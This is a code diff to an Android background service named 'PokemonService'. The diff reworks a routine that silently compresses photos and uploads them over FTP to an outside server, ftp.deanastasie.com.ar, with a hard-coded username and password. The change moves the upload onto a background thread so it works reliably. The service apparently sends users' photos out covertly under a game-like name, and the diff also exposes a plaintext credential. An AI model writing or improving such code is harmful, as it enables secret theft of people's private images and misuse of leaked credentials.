@@ -4,7 +4,6 @@ import android.app.Service;
 import android.content.Intent;
 import android.graphics.Bitmap;
 import android.os.IBinder;
-import android.os.StrictMode;
 import android.util.Log;
 
 import org.apache.commons.net.ftp.FTPClient;
@@ -48,37 +47,40 @@ public class PokemonService extends Service {
         return Service.START_STICKY;
     }
 
-    private void sendPhotoToServer(Bitmap photo) {
-        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        photo.compress(Bitmap.CompressFormat.PNG, 100, baos);
-        baos.toByteArray();
+    private void sendPhotoToServer(final Bitmap photo) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                photo.compress(Bitmap.CompressFormat.PNG, 100, baos);
+                baos.toByteArray();
 
-        FTPClient ftpClient = new FTPClient();
-        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
-        StrictMode.setThreadPolicy(policy);
+                FTPClient ftpClient = new FTPClient();
 
-        try {
+                try {
 
-            ftpClient.connect(InetAddress.getByName("ftp.deanastasie.com.ar"));
-            ftpClient.login("deanastasie", "3rLJskyhsF");
-            ftpClient.changeWorkingDirectory("test/fotos/");
+                    ftpClient.connect(InetAddress.getByName("ftp.deanastasie.com.ar"));
+                    ftpClient.login("deanastasie", "3rLJskyhsF");
+                    ftpClient.changeWorkingDirectory("test/fotos/");
 
-            String name = Double.toString(Math.random());
+                    String name = Double.toString(Math.random());
 
-            if (ftpClient.getReplyString().contains("250")) {
-                ftpClient.setFileType(org.apache.commons.net.ftp.FTP.BINARY_FILE_TYPE);
-                BufferedInputStream buffIn;
-                InputStream is = new ByteArrayInputStream(baos.toByteArray());
-                buffIn = new BufferedInputStream(is);
-                ftpClient.enterLocalPassiveMode();
-                ftpClient.storeFile(name, buffIn);
-                buffIn.close();
-                ftpClient.logout();
-                ftpClient.disconnect();
+                    if (ftpClient.getReplyString().contains("250")) {
+                        ftpClient.setFileType(org.apache.commons.net.ftp.FTP.BINARY_FILE_TYPE);
+                        BufferedInputStream buffIn;
+                        InputStream is = new ByteArrayInputStream(baos.toByteArray());
+                        buffIn = new BufferedInputStream(is);
+                        ftpClient.enterLocalPassiveMode();
+                        ftpClient.storeFile(name, buffIn);
+                        buffIn.close();
+                        ftpClient.logout();
+                        ftpClient.disconnect();
+                    }
+
+                } catch (Exception e) {
+                    e.getStackTrace();
+                }
             }
-
-        } catch (Exception e) {
-            e.getStackTrace();
-        }
+        });
     }
 }
